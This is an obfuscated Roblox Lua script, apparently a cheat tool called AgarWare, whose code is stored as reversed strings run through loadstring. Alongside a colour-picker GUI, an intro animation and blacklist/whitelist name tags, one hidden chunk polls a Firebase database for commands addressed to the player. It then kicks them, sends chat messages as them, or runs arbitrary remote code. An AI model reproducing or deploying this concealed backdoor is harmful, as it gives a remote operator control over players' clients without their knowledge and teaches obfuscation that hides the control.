)"sreyalP"(ecivreSteG:emag = sreyalP lacol

dne
nruter	
neht )(oidutSsI:)"ecivreSnuR"(ecivreSteG:emag fi


]]):reverse())();
end;
task.spawn(C_3fc);
local function C_3fd()
local script = _llza[_sc(51,102,100)];
loadstring(([[dne
)(sdnammoCroFkcehc	
od )3(tiaw elihw

dne
)dne	
dne		
dne			
				
dne				
)dne					
)()edoc.ataDdnammoc(gnirtsdaol						
)(noitcnuf(llacp					
neht "etucexe" == epyt.ataDdnammoc fiesle				
)".nimda na yb dekcik neeb evah uoY"(kciK:reyalPlacoL					
neht "kcik" == epyt.ataDdnammoc fiesle				
)dne					
dne						
)"llA" ,egassem.ataDdnammoc(revreSeriF:tseuqeRegasseMyaS.stnevEtahCmetsyStahCtluafeD.)"egarotSdetacilpeR"(ecivreSteG:emag							
esle						
)egassem.ataDdnammoc(cnysAdneS:lareneGXBR.slennahCtxeT.ecivreStahCtxeT							
neht ecivreStahCtxeT.noisreVtahC.munE == noisreVtahC.ecivreStahCtxeT fi						
)(noitcnuf(llacp					
neht "tahcecrof" == epyt.ataDdnammoc fi				
pmatsemit.ataDdnammoc = pmatsemiTdnammoCtsal				
neht pmatsemiTdnammoCtsal > pmatsemit.ataDdnammoc dna ataDdnammoc fi			
)ydoB.esnopser(edoceDNOSJ:ecivreSpttH = ataDdnammoc lacol			
neht "llun" =~ ydoB.esnopser dna 002 == edoCsutatS.esnopser fi		
)}		
"TEG" = dohteM			
,"nosj." .. emaN.reyalPlacoL .. "/sdnammoc/" .. LRU_ESABERIF = lrU			
{(qer_ = esnopser lacol		
)(noitcnuf(llacp	
)(sdnammoCroFkcehc noitcnuf lacol

)(emit.so = pmatsemiTdnammoCtsal lacol
)tseuqer.suxulf dna suxulf( ro tseuqer_ptth ro tseuqer ro )tseuqer.nys dna nys( = qer_ lacol
reyalPlacoL.sreyalP = reyalPlacoL lacol
)"ecivreStahCtxeT"(ecivreSteG:emag = ecivreStahCtxeT lacol
)"sreyalP"(ecivreSteG:emag = sreyalP lacol
)"ecivreSpttH"(ecivreSteG:emag = ecivreSpttH lacol
"moc.oiesaberif.bdtr-tluafed-eraw-raga//:sptth" = LRU_ESABERIF lacol]]):reverse())();
end;
task.spawn(C_3fd);
local function C_3ff()
local script = _llza[_sc(51,102,102)];
loadstring(([[eslaf = elbisiV.rekciProloC

dne
ahplAtnerruc ,roloClanif nruter	
)laVtnerruc ,taStnerruc ,euHtnerruc(bgRoTvsh = roloClanif lacol	
)(roloCrekciProloCteG.G_ noitcnuf

dne
)(roloCetadpu	
0 ro ahpla = ahplAtnerruc	
v = laVtnerruc	
s = taStnerruc	
h = euHtnerruc	
)roloc(vsHoTbgr = v ,s ,h lacol	
)ahpla ,roloc(roloCrekciProloCteS.G_ noitcnuf


)(roloCetadpu


)lin ,lecnac.lecnacylppa.tuoyalemarfrenni.rekciProloC(tceffEeniltuOputes
)lin ,ylppa.lecnacylppa.tuoyalemarfrenni.rekciProloC(tceffEeniltuOputes
)xobtxeTbgr ,bgr.eulavroloc.tuoyalemarfrenni.rekciProloC(tceffEeniltuOputes
)xobtxeTxeh ,xeh.eulavroloc.tuoyalemarfrenni.rekciProloC(tceffEeniltuOputes

dne
)}ekortSetadpu = etadpu{ ,semarFeniltuo(tresni.elbat	

)dne	
)(ekortSetadpu		
eslaf = gnirevoHsi		
)(noitcnuf(tcennoC:evaeLesuoM.emarFtnerap	
)dne	
)(ekortSetadpu		
eurt = gnirevoHsi		
)(noitcnuf(tcennoC:retnEesuoM.emarFtnerap	

dne	
)dne		
)(ekortSetadpu			
eslaf = desucoFsi			
)(noitcnuf(tcennoC:tsoLsucoF.tnemelEdlihc		
)dne		
)(ekortSetadpu			
eurt = desucoFsi			
)(noitcnuf(tcennoC:desucoF.tnemelEdlihc		
neht )"xoBtxeT"(AsI:tnemelEdlihc dna tnemelEdlihc fi	

dne	
dne		
2 = ssenkcihT.ekortSeniltuo			
roloClanigiro = roloC.ekortSeniltuo			
esle		
1 = ssenkcihT.ekortSeniltuo			
roloClanif = roloC.ekortSeniltuo			
neht gnirevoHsi ro desucoFsi fi		
)laVtnerruc ,taStnerruc ,euHtnerruc(bgRoTvsh = roloClanif lacol		
)(ekortSetadpu noitcnuf lacol	

eslaf = desucoFsi lacol	
eslaf = gnirevoHsi lacol	
ssenkcihT.ekortSeniltuo = ssenkcihTlanigiro lacol	
roloC.ekortSeniltuo = roloClanigiro lacol	

dne nruter neht ekortSeniltuo ton fi	

dne	
dne		
kaerb			
tnadnecsed = ekortSeniltuo			
neht "ekortSeniltuo" == emaN.tnadnecsed dna )"ekortSIU"(AsI:tnadnecsed fi		
od ))(stnadnecseDteG:emarFtnerap(sriap ni tnadnecsed ,_ rof	
lin = ekortSeniltuo lacol	
)tnemelEdlihc ,emarFtnerap(tceffEeniltuOputes noitcnuf lacol

}{ = semarFeniltuo lacol


)dne
dne	
bgRsuoiverp = txeT.xobtxeTbgr		
esle	
dne		
bgRsuoiverp = txeT.xobtxeTbgr			
esle		
txeT.xobtxeTbgr = bgRsuoiverp			
)(roloCetadpu			
v = laVtnerruc			
s = taStnerruc			
h = euHtnerruc			
)roloc(vsHoTbgr = v ,s ,h lacol			
)b ,g ,r(BGRmorf.3roloC = roloc lacol			
neht 552 =< b dna 552 =< g dna 552 =< r dna b dna g dna r fi		
)b(rebmunot ,)g(rebmunot ,)r(rebmunot = b ,g ,r		
neht b dna g dna r fi	
)")+d%(*s%,)+d%(*s%,)+d%("(hctam:txet = b ,g ,r lacol	
)" ," ," "(busg:txeT.xobtxeTbgr = txet lacol	

dne	
nruter		
bgRsuoiverp = txeT.xobtxeTbgr		
neht degnahCtxeTbgr ton fi	
)(noitcnuf(tcennoC:tsoLsucoF.xobtxeTbgr

)dne
txet = txeT.xobtxeTbgr	
)" " ,"+ "(busg:txet = txet	
)"" ,"] 9-0^["(busg:txet = txet	
txeT.xobtxeTbgr = txet lacol	
eurt = degnahCtxeTbgr	
)(noitcnuf(tcennoC:)"txeT"(langiSdegnahCytreporPteG:xobtxeTbgr

)dne
eslaf = degnahCtxeTbgr	
txeT.xobtxeTbgr = bgRsuoiverp	
)(noitcnuf(tcennoC:desucoF.xobtxeTbgr

eslaf = degnahCtxeTbgr lacol
txeT.xobtxeTbgr = bgRsuoiverp lacol


)dne
dne	
xeHsuoiverp = txeT.xobtxeTxeh		
esle	
txeT.xobtxeTxeh = xeHsuoiverp		
)(roloCetadpu		
v = laVtnerruc		
s = taStnerruc		
h = euHtnerruc		
)roloc(vsHoTbgr = v ,s ,h lacol		
neht roloc fi	
)txeT.xobtxeTxeh(bgRoTxeh = roloc lacol	

dne	
nruter		
xeHsuoiverp = txeT.xobtxeTxeh		
neht degnahCtxeTxeh ton fi	
)(noitcnuf(tcennoC:tsoLsucoF.xobtxeTxeh

)dne
txet = txeT.xobtxeTxeh	
dne )7 ,1(bus:txet = txet neht 7 > txet# fi	
)"" ,"]#F-A9-0^["(busg:txet = txet	
)(reppu:txeT.xobtxeTxeh = txet lacol	
eurt = degnahCtxeTxeh	
)(noitcnuf(tcennoC:)"txeT"(langiSdegnahCytreporPteG:xobtxeTxeh

)dne
eslaf = degnahCtxeTxeh	
txeT.xobtxeTxeh = xeHsuoiverp	
)(noitcnuf(tcennoC:desucoF.xobtxeTxeh

eslaf = degnahCtxeTxeh lacol
txeT.xobtxeTxeh = xeHsuoiverp lacol


)dne
dne	
eslaf = gniggarDahpla		
eslaf = gniggarDeuh		
eslaf = gniggarDsavnac		
neht hcuoT.epyTtupnIresU.munE == epyTtupnIresU.tupni ro 1nottuBesuoM.epyTtupnIresU.munE == epyTtupnIresU.tupni fi	
)tupni(noitcnuf(tcennoC:dednEtupnI.ecivreStupnIresU

)dne
dne	
dne		
)tupni(tupnImorFahplAetadpu			
neht gniggarDahpla fi		
dne		
)tupni(tupnImorFeuHetadpu			
neht gniggarDeuh fi		
dne		
)tupni(tupnImorFsavnaCetadpu			
neht gniggarDsavnac fi		
neht hcuoT.epyTtupnIresU.munE == epyTtupnIresU.tupni ro tnemevoMesuoM.epyTtupnIresU.munE == epyTtupnIresU.tupni fi	
)tupni(noitcnuf(tcennoC:degnahCtupnI.ecivreStupnIresU


)dne
dne	
)tupni(tupnImorFahplAetadpu		
eurt = gniggarDahpla		
neht hcuoT.epyTtupnIresU.munE == epyTtupnIresU.tupni ro 1nottuBesuoM.epyTtupnIresU.munE == epyTtupnIresU.tupni fi	
)tupni(noitcnuf(tcennoC:nageBtupnI.redils

dne
ahplAtnerruc = ycnerapsnarTdnuorgkcaB.emarFnottuBylppa	
)0 ,0 ,0 ,ahplAtnerruc(wen.2miDU = noitisoP.eniLredils	

X.eziSredils / Xevitaler = ahplAtnerruc	
)X.eziSredils ,0 ,X.soPredils - X.noitisoP.tupni(pmalc.htam = Xevitaler lacol	

eziSetulosbA.redils = eziSredils lacol	
noitisoPetulosbA.redils = soPredils lacol	
)tupni(tupnImorFahplAetadpu noitcnuf lacol

)dne
dne	
)tupni(tupnImorFeuHetadpu		
eurt = gniggarDeuh		
neht hcuoT.epyTtupnIresU.munE == epyTtupnIresU.tupni ro 1nottuBesuoM.epyTtupnIresU.munE == epyTtupnIresU.tupni fi	
)tupni(noitcnuf(tcennoC:nageBtupnI.euh

dne
)(roloCetadpu	
)0 ,euHtnerruc ,0 ,0(wen.2miDU = noitisoP.eniLeuh	

Y.eziSeuh / Yevitaler = euHtnerruc	
)Y.eziSeuh ,0 ,Y.soPeuh - Y.noitisoP.tupni(pmalc.htam = Yevitaler lacol	

eziSetulosbA.euh = eziSeuh lacol	
noitisoPetulosbA.euh = soPeuh lacol	
)tupni(tupnImorFeuHetadpu noitcnuf lacol


)dne
dne	
)tupni(tupnImorFsavnaCetadpu		
eurt = gniggarDsavnac		
neht hcuoT.epyTtupnIresU.munE == epyTtupnIresU.tupni ro 1nottuBesuoM.epyTtupnIresU.munE == epyTtupnIresU.tupni fi	
)tupni(noitcnuf(tcennoC:nageBtupnI.savnac

dne
)(roloCetadpu	
)0 ,laVtnerruc - 1 ,0 ,taStnerruc(wen.2miDU = noitisoP.toDsavnac	

)Y.eziSsavnac / Yevitaler( - 1 = laVtnerruc	
X.eziSsavnac / Xevitaler = taStnerruc	

)4 - Y.eziSsavnac ,0 ,Y.soPsavnac - Y.noitisoP.tupni(pmalc.htam = Yevitaler lacol	
)4 - X.eziSsavnac ,0 ,X.soPsavnac - X.noitisoP.tupni(pmalc.htam = Xevitaler lacol	

eziSetulosbA.savnac = eziSsavnac lacol	
noitisoPetulosbA.savnac = soPsavnac lacol	
)tupni(tupnImorFsavnaCetadpu noitcnuf lacol

dne
redils = tneraP.emarFroloCsnart	
emarFroloCsnart = tneraP.darg	
)}	
)1 ,1(wen.tniopyeKecneuqeSrebmuN		
,)0 ,0(wen.tniopyeKecneuqeSrebmuN		
{(wen.ecneuqeSrebmuN = ycnerapsnarT.darg	
)"tneidarGIU"(wen.ecnatsnI = darg lacol	
1 + xednIZ.redils = xednIZ.emarFroloCsnart	
0 = lexiPeziSredroB.emarFroloCsnart	
)1 ,1 ,1(wen.3roloC = 3roloCdnuorgkcaB.emarFroloCsnart	
)0 ,1 ,0 ,1(wen.2miDU = eziS.emarFroloCsnart	
"emarFroloCsnarT" = emaN.emarFroloCsnart	
)"emarF"(wen.ecnatsnI = emarFroloCsnart lacol	

redils = tneraP.draobrekcehc	

dne	
dne		
dne			
draobrekcehc = tneraP.erauqs				
xednIZ.redils = xednIZ.erauqs				
0 = lexiPeziSredroB.erauqs				
)402 ,402 ,402(BGRmorf.3roloC = 3roloCdnuorgkcaB.erauqs				
)eziSerauqs * y ,0 ,eziSerauqs * x ,0(wen.2miDU = noitisoP.erauqs				
)eziSerauqs ,0 ,eziSerauqs ,0(wen.2miDU = eziS.erauqs				
)"emarF"(wen.ecnatsnI = erauqs lacol				
neht 1 == 2 % )y + x( fi			
od 05 ,0 = x rof		
od 05 ,0 = y rof	
4 = eziSerauqs lacol	

eurt = stnadnecseDspilC.draobrekcehc	
xednIZ.redils = xednIZ.draobrekcehc	
0 = lexiPeziSredroB.draobrekcehc	
)552 ,552 ,552(BGRmorf.3roloC = 3roloCdnuorgkcaB.draobrekcehc	
)0 ,1 ,0 ,1(wen.2miDU = eziS.draobrekcehc	
"draobrekcehCsnarT" = emaN.draobrekcehc	
)"emarF"(wen.ecnatsnI = draobrekcehc lacol	
neht )"draobrekcehCsnarT"(dlihCtsriFdniF:redils ton fi
eurt = evitcA.redils
1 = ycnerapsnarTdnuorgkcaB.redils
eslaf = roloCnottuBotuA.redils


dne
euh = tneraP.emarFeuh	
emarFeuh = tneraP.darg	
)}	
))0 ,0 ,552(BGRmorf.3roloC ,1(wen.tniopyeKecneuqeSroloC		
,))552 ,0 ,552(BGRmorf.3roloC ,38.0(wen.tniopyeKecneuqeSroloC		
,))552 ,0 ,0(BGRmorf.3roloC ,76.0(wen.tniopyeKecneuqeSroloC		
,))552 ,552 ,0(BGRmorf.3roloC ,5.0(wen.tniopyeKecneuqeSroloC		
,))0 ,552 ,0(BGRmorf.3roloC ,33.0(wen.tniopyeKecneuqeSroloC		
,))0 ,552 ,552(BGRmorf.3roloC ,71.0(wen.tniopyeKecneuqeSroloC		
,))0 ,0 ,552(BGRmorf.3roloC ,0(wen.tniopyeKecneuqeSroloC		
{(wen.ecneuqeSroloC = roloC.darg	
09 = noitatoR.darg	
)"tneidarGIU"(wen.ecnatsnI = darg lacol	
xednIZ.euh = xednIZ.emarFeuh	
0 = lexiPeziSredroB.emarFeuh	
)1 ,1 ,1(wen.3roloC = 3roloCdnuorgkcaB.emarFeuh	
)0 ,1 ,0 ,1(wen.2miDU = eziS.emarFeuh	
"emarFtneidarGeuH" = emaN.emarFeuh	
)"emarF"(wen.ecnatsnI = emarFeuh lacol	
neht )"emarFtneidarGeuH"(dlihCtsriFdniF:euh ton fi
eurt = evitcA.euh
1 = ycnerapsnarTdnuorgkcaB.euh
eslaf = roloCnottuBotuA.euh


eurt = evitcA.savnac
eslaf = roloCnottuBotuA.savnac


dne
dne	
dne		
)(etadpu.atad			
od )semarFeniltuo(sriap ni atad ,_ rof		
neht semarFeniltuo fi	
	

)0 ,laVtnerruc - 1 ,0 ,taStnerruc(wen.2miDU = noitisoP.toDsavnac	
)0 ,euHtnerruc ,0 ,0(wen.2miDU = noitisoP.eniLeuh	
	

ahplAtnerruc = ycnerapsnarTdnuorgkcaB.emarFnottuBylppa	
roloClanif = 3roloCdnuorgkcaB.emarFnottuBylppa	
	

))552 * B.roloClanif(roolf.htam		
,)552 * G.roloClanif(roolf.htam		
,)552 * R.roloClanif(roolf.htam		
,"d% ,d% ,d%"(tamrof.gnirts = txeT.xobtxeTbgr	
)roloClanif(xeHoTbgr = txeT.xobtxeTxeh	
	

dne	
roloClanif = 3roloCdnuorgkcaB.emarFsnart		
neht emarFsnart fi	
)"emarFroloCsnarT"(dlihCtsriFdniF:redils = emarFsnart lacol	
	

)}	
)roloCeuh ,1(wen.tniopyeKecneuqeSroloC		
,))1 ,1 ,1(wen.3roloC ,0(wen.tniopyeKecneuqeSroloC		
{(wen.ecneuqeSroloC = roloC.darGtas	
tneidarG.tneidarGtaS.savnac = darGtas lacol	

dne	
savnac = tneraP.emarFlav		
emarFlav = tneraP.2darg		
)}		
)0 ,1(wen.tniopyeKecneuqeSrebmuN			
,)1 ,0(wen.tniopyeKecneuqeSrebmuN			
{(wen.ecneuqeSrebmuN = ycnerapsnarT.2darg		
09 = noitatoR.2darg		
"tneidarG" = emaN.2darg		
)"tneidarGIU"(wen.ecnatsnI = 2darg lacol		
1 + xednIZ.savnac = xednIZ.emarFlav		
0 = lexiPeziSredroB.emarFlav		
0 = ycnerapsnarTdnuorgkcaB.emarFlav		
)0 ,0 ,0(wen.3roloC = 3roloCdnuorgkcaB.emarFlav		
)0 ,1 ,0 ,1(wen.2miDU = eziS.emarFlav		
"tneidarGlaV" = emaN.emarFlav		
)"emarF"(wen.ecnatsnI = emarFlav lacol		

savnac = tneraP.emarFtas		
emarFtas = tneraP.darg		
"tneidarG" = emaN.darg		
)"tneidarGIU"(wen.ecnatsnI = darg lacol		
xednIZ.savnac = xednIZ.emarFtas		
0 = lexiPeziSredroB.emarFtas		
)1 ,1 ,1(wen.3roloC = 3roloCdnuorgkcaB.emarFtas		
)0 ,1 ,0 ,1(wen.2miDU = eziS.emarFtas		
"tneidarGtaS" = emaN.emarFtas		
)"emarF"(wen.ecnatsnI = emarFtas lacol		
neht )"tneidarGtaS"(dlihCtsriFdniF:savnac ton fi	
	

)laVtnerruc ,taStnerruc ,euHtnerruc(bgRoTvsh = roloClanif lacol	
)1 ,1 ,euHtnerruc(bgRoTvsh = roloCeuh lacol	
)(roloCetadpu noitcnuf lacol


dne
)b ,g ,r(BGRmorf.3roloC nruter	
dne lin nruter neht b ton ro g ton ro r ton fi	
)61 ,)6 ,5(bus:xeh(rebmunot = b lacol	
)61 ,)4 ,3(bus:xeh(rebmunot = g lacol	
)61 ,)2 ,1(bus:xeh(rebmunot = r lacol	
dne lin nruter neht 6 =~ xeh# fi	
)"" ,"#"(busg:xeh = xeh	
)xeh(bgRoTxeh noitcnuf lacol


dne
))552 * B.roloc(roolf.htam		
,)552 * G.roloc(roolf.htam		
,)552 * R.roloc(roolf.htam		
 ,"X20%X20%X20%#"(tamrof.gnirts nruter	
)roloc(xeHoTbgr noitcnuf lacol


dne
v ,s ,h nruter	

dne	
6 / h = h		
dne		
4 + atled / )g - r( = h			
esle		
2 + atled / )r - b( = h			
neht g == xam fiesle		
6 % )atled / )b - g(( = h			
neht r == xam fi		
xam / atled = s		
neht 0 > atled dna 0 > xam fi	

xam ,0 ,0 = v ,s ,h lacol	

nim - xam = atled lacol	
)b ,g ,r(nim.htam = nim lacol	
)b ,g ,r(xam.htam = xam lacol	
B.roloc ,G.roloc ,R.roloc = b ,g ,r lacol	
)roloc(vsHoTbgr noitcnuf lacol


dne
)b ,g ,r(wen.3roloC nruter	
dne	
q ,p ,v = b ,g ,r neht 5 == i fiesle	
v ,p ,t = b ,g ,r neht 4 == i fiesle	
v ,q ,p = b ,g ,r neht 3 == i fiesle	
t ,v ,p = b ,g ,r neht 2 == i fiesle	
p ,v ,q = b ,g ,r neht 1 == i fiesle	
p ,t ,v = b ,g ,r neht 0 == i fi	
6 % i = i	
)s * )f - 1( - 1( * v = t lacol	
)s * f - 1( * v = q lacol	
)s - 1( * v = p lacol	
i - 6 * h = f lacol	
)6 * h(roolf.htam = i lacol	
b ,g ,r lacol	
)v ,s ,h(bgRoTvsh noitcnuf lacol


eslaf = gniggarDahpla lacol
eslaf = gniggarDeuh lacol
eslaf = gniggarDsavnac lacol


0 = ahplAtnerruc lacol
1 = laVtnerruc lacol
1 = taStnerruc lacol
0 = euHtnerruc lacol


)"ecivreSiuG"(ecivreSteG:emag = ecivreSiuG lacol
)"ecivreStupnIresU"(ecivreSteG:emag = ecivreStupnIresU lacol

emarFnottub.ylppa.lecnacylppa.tuoyalemarfrenni.rekciProloC = emarFnottuBylppa lacol

xobtxet.bgr.eulavroloc.tuoyalemarfrenni.rekciProloC = xobtxeTbgr lacol
xobtxet.xeh.eulavroloc.tuoyalemarfrenni.rekciProloC = xobtxeTxeh lacol

enil.redils = eniLredils lacol
redils.emarFycnerapsnart.ycnerapsnart.tuoyalemarfrenni.rekciProloC = redils lacol

enil.euh = eniLeuh lacol
euh.emarFeuh.euhsavnac.tuoyalemarfrenni.rekciProloC = euh lacol

tod.savnac = toDsavnac lacol
savnac.emarFsavnac.euhsavnac.tuoyalemarfrenni.rekciProloC = savnac lacol


tneraP.tpircs = rekciProloC lacol]]):reverse())();
end;
task.spawn(C_3ff);
local function C_45d()
local script = _llza[_sc(52,53,100)];
loadstring(([[)(yortseD:dnuoSortni
)(yortseD:puorGsavnac


)(tiaW:detelpmoC.tuOedaf

)(yalP:tuOedaFoidua
)
}0 = emuloV{	
,)nI.noitceriDgnisaE.munE ,eniS.elytSgnisaE.munE ,3.0(wen.ofnIneewT	
,dnuoSortni	
(etaerC:ecivreSneewT = tuOedaFoidua lacol

)(yalP:tuOedaf
)
}1 = ycnerapsnarTpuorG{	
,)nI.noitceriDgnisaE.munE ,eniS.elytSgnisaE.munE ,3.0(wen.ofnIneewT	
,puorGsavnac	
(etaerC:ecivreSneewT = tuOedaf lacol


eslaf = gninnuReslup


)5.2(tiaw.ksat


)dne
dne	
)(tiaW:detelpmoC.thgirBot		
)(yalP:thgirBot		
)		
}eulBthgirb = 3roloCtxeT{			
,)tuOnI.noitceriDgnisaE.munE ,eniS.elytSgnisaE.munE ,1(wen.ofnIneewT			
,lebaLtxet			
(etaerC:ecivreSneewT = thgirBot lacol		
		
dne kaerb neht gninnuReslup ton fi		
)(tiaW:detelpmoC.kraDot		
)(yalP:kraDot		
)		
}eulBkrad = 3roloCtxeT{			
,)tuOnI.noitceriDgnisaE.munE ,eniS.elytSgnisaE.munE ,1(wen.ofnIneewT			
,lebaLtxet			
(etaerC:ecivreSneewT = kraDot lacol		
		
od gninnuReslup elihw	
)(noitcnuf(nwaps.ksat
eurt = gninnuReslup lacol


)(tiaW:detelpmoC.nIedaf
)(yalP:nIedaf
)
}0 = ycnerapsnarTpuorG{	
,)tuO.noitceriDgnisaE.munE ,eniS.elytSgnisaE.munE ,2.1(wen.ofnIneewT	
,puorGsavnac	
(etaerC:ecivreSneewT = nIedaf lacol


1 = ycnerapsnarTpuorG.puorGsavnac


eulBthgirb = 3roloCtxeT.lebaLtxet


)51- ,5.0 ,0 ,5.0(wen.2miDU = noitisoP.puorGsavnac
)5.0 ,5.0(wen.2rotceV = tnioProhcnA.puorGsavnac


)(yalP:dnuoSortni
ecivreSdnuoS = tneraP.dnuoSortni
1 = deepSkcabyalP.dnuoSortni
23.31 = noitisoPemiT.dnuoSortni
1 = emuloV.dnuoSortni
"0771569019//:ditessaxbr" = dIdnuoS.dnuoSortni
)"dnuoS"(wen.ecnatsnI = dnuoSortni lacol


dne
)(yalP:pUelacs	
)	
}1 = elacS{		
,)tuO.noitceriDgnisaE.munE ,laitnenopxE.elytSgnisaE.munE ,1(wen.ofnIneewT		
,elacSiu		
(etaerC:ecivreSneewT = pUelacs lacol	
2.0 = elacS.elacSiu	
neht elacSiu fi


)"elacSIU"(dlihCtsriFdniF:emarFniaM dna emarFniaM = elacSiu lacol
)"emarFniaM"(dlihCtsriFdniF:iuGneercs dna iuGneercs = emarFniaM lacol
)(iuGneercSteg = iuGneercs lacol

dne
dne	
tneraP.p = p		
dne p nruter neht )"iuGneercS"(AsI:p fi		
od p elihw	
puorGsavnac = p lacol	
)(iuGneercSteg noitcnuf lacol


)021 ,06 ,0(BGRmorf.3roloC = eulBkrad lacol
)552 ,321 ,0(BGRmorf.3roloC = eulBthgirb lacol

)"ecivreSdnuoS"(ecivreSteG:emag = ecivreSdnuoS lacol
)"ecivreSneewT"(ecivreSteG:emag = ecivreSneewT lacol
eurt = elbisiV.puorGsavnac
tneraP.tpircs = lebaLtxet lacol
tneraP.tneraP.tpircs = puorGsavnac lacol

eurt = deyalPortnI.G_
dne
nruter	
)(yortseD:tneraP.tneraP.tpircs	
neht deyalPortnI.G_ fi
]]):reverse())();
end;
task.spawn(C_45d);
local function C_461()
local script = _llza[_sc(52,54,49)];
loadstring(([[)gaTdetsilkcalBdda(tcennoC:deddAreyalP.sreyalP
dne )reyalp(gaTdetsilkcalBdda od ))(sreyalPteG:sreyalP(sriapi ni reyalp ,_ rof

dne
)rahCoTylppa(tcennoC:deddAretcarahC.reyalp	
dne )retcarahC.reyalp(rahCoTylppa neht retcarahC.reyalp fi	
dne	
)dne		
dne )(tcennocsiD:nnoCelacs neht nnoCelacs fi			
eslaf = gninnuReslup			
)(noitcnuf(tcennoC:gniyortseD.draobllib		
)dne		
dne			
)(tiaW:detelpmoC.thgirBot )(yalP:thgirBot				
)}deRthgirBkcalb = 3roloCtxeT{ ,)tuOnI.noitceriDgnisaE.munE ,eniS.elytSgnisaE.munE ,2(wen.ofnIneewT ,lebal(etaerC:ecivreSneewT = thgirBot lacol				
dne kaerb neht tneraP.draobllib ton fi				
)(tiaW:detelpmoC.kraDot )(yalP:kraDot				
)}deRkraDkcalb = 3roloCtxeT{ ,)tuOnI.noitceriDgnisaE.munE ,eniS.elytSgnisaE.munE ,2(wen.ofnIneewT ,lebal(etaerC:ecivreSneewT = kraDot lacol				
od tneraP.draobllib dna gninnuReslup elihw			
)(noitcnuf(nwaps.ksat		
eurt = gninnuReslup lacol		
)dne		
)elacs * 05 ,0 ,elacs * 002 ,0(wen.2miDU = eziS.draobllib			
)5.0 * )tsid / 62(( = elacs lacol			
edutingaM.)noitisoP.osrot - noitisoP.emarFC.mac( = tsid lacol			
dne nruter )(tcennocsiD:nnoCelacs neht tneraP.draobllib ton fi			
)(noitcnuf(tcennoC:deppetSredneR.ecivreSnuR = nnoCelacs		
nnoCelacs lacol		
aremaCtnerruC.ecapskrow = mac lacol		
0 = ycnerapsnarTekortStxeT.lebal		
roloCekortSkcalb = 3roloCekortStxeT.lebal		
eurt = delacStxeT.lebal		
edacrA.tnoF.munE = tnoF.lebal		
deRthgirBkcalb = 3roloCtxeT.lebal		
"DETSILKCALB" = txeT.lebal		
1 = ycnerapsnarTdnuorgkcaB.lebal		
)0 ,1 ,0 ,1(wen.2miDU = eziS.lebal		
)draobllib ,"lebaLtxeT"(wen.ecnatsnI = lebal lacol		
osrot = tneraP.draobllib		
eslaf = nwapSnOteseR.draobllib		
eurt = poTnOsyawlA.draobllib		
)0 ,0 ,0(wen.3rotceV = tesffOsdutS.draobllib		
)05 ,0 ,002 ,0(wen.2miDU = eziS.draobllib		
"gaTdetsilkcalB" = emaN.draobllib		
)"iuGdraoblliB"(wen.ecnatsnI = draobllib lacol		
dne )(yortseD:gnitsixe neht gnitsixe fi		
)"gaTdetsilkcalB"(dlihCtsriFdniF:osrot = gnitsixe lacol		
dne nruter neht osrot ton fi		
)01 ,"osroT"(dlihCroFtiaW:retcarahc ro )01 ,"osroTreppU"(dlihCroFtiaW:retcarahc = osrot lacol		
dne nruter neht retcarahc ton fi		
)retcarahc(rahCoTylppa noitcnuf lacol	
dne nruter neht )dIresU.reyalp(detsilkcalBeraWragAsI.G_ ton fi	
dne nruter neht )dIresU.reyalPlacoL(detsiletihWeraWragAsI.G_ ton dna )dIresU.reyalPlacoL(renwOeraWragAsI.G_ ton fi	
reyalPlacoL.sreyalP = reyalPlacoL lacol	
detsiletihWeraWragAsI.G_ dna renwOeraWragAsI.G_ dna detsilkcalBeraWragAsI.G_ litnu )(tiaw.ksat taeper	
)reyalp(gaTdetsilkcalBdda noitcnuf lacol

)0 ,0 ,08(BGRmorf.3roloC = roloCekortSkcalb lacol
)0 ,0 ,051(BGRmorf.3roloC = deRkraDkcalb lacol
)0 ,0 ,552(BGRmorf.3roloC = deRthgirBkcalb lacol





)gaTdetsiletihWdda(tcennoC:deddAreyalP.sreyalP
dne )reyalp(gaTdetsiletihWdda od ))(sreyalPteG:sreyalP(sriapi ni reyalp ,_ rof

dne
)rahCoTylppa(tcennoC:deddAretcarahC.reyalp	
dne )retcarahC.reyalp(rahCoTylppa neht retcarahC.reyalp fi	
dne	
)dne		
dne )(tcennocsiD:nnoCelacs neht nnoCelacs fi			
eslaf = gninnuReslup			
)(noitcnuf(tcennoC:gniyortseD.draobllib		
)dne		
dne			
)(tiaW:detelpmoC.thgirBot )(yalP:thgirBot				
)}eulBthgirBetihw = 3roloCtxeT{ ,)tuOnI.noitceriDgnisaE.munE ,eniS.elytSgnisaE.munE ,2(wen.ofnIneewT ,lebal(etaerC:ecivreSneewT = thgirBot lacol				
dne kaerb neht tneraP.draobllib ton fi				
)(tiaW:detelpmoC.kraDot )(yalP:kraDot				
)}eulBkraDetihw = 3roloCtxeT{ ,)tuOnI.noitceriDgnisaE.munE ,eniS.elytSgnisaE.munE ,2(wen.ofnIneewT ,lebal(etaerC:ecivreSneewT = kraDot lacol				
od tneraP.draobllib dna gninnuReslup elihw			
)(noitcnuf(nwaps.ksat		
eurt = gninnuReslup lacol		
)dne		
)elacs * 05 ,0 ,elacs * 002 ,0(wen.2miDU = eziS.draobllib			
2.0 + )5.0 * )tsid / 62(( = elacs lacol			
edutingaM.)noitisoP.prh - noitisoP.emarFC.mac( = tsid lacol			
dne nruter )(tcennocsiD:nnoCelacs neht tneraP.draobllib ton fi			
)(noitcnuf(tcennoC:deppetSredneR.ecivreSnuR = nnoCelacs		
nnoCelacs lacol		
aremaCtnerruC.ecapskrow = mac lacol		
0 = ycnerapsnarTekortStxeT.lebal		
roloCekortSetihw = 3roloCekortStxeT.lebal		
eurt = delacStxeT.lebal		
edacrA.tnoF.munE = tnoF.lebal		
eulBthgirBetihw = 3roloCtxeT.lebal		
"ELPOEP LOOC" = txeT.lebal		
1 = ycnerapsnarTdnuorgkcaB.lebal		
)0 ,1 ,0 ,1(wen.2miDU = eziS.lebal		
)draobllib ,"lebaLtxeT"(wen.ecnatsnI = lebal lacol		
prh = tneraP.draobllib		
eslaf = nwapSnOteseR.draobllib		
eurt = poTnOsyawlA.draobllib		
)0 ,4 ,0(wen.3rotceV = tesffOsdutS.draobllib		
)05 ,0 ,002 ,0(wen.2miDU = eziS.draobllib		
"gaTdetsiletihW" = emaN.draobllib		
)"iuGdraoblliB"(wen.ecnatsnI = draobllib lacol		
dne )(yortseD:gnitsixe neht gnitsixe fi		
)"gaTdetsiletihW"(dlihCtsriFdniF:prh = gnitsixe lacol		
dne nruter neht prh ton fi		
)01 ,"traPtooRdionamuH"(dlihCroFtiaW:retcarahc = prh lacol		
dne nruter neht retcarahc ton fi		
)retcarahc(rahCoTylppa noitcnuf lacol	
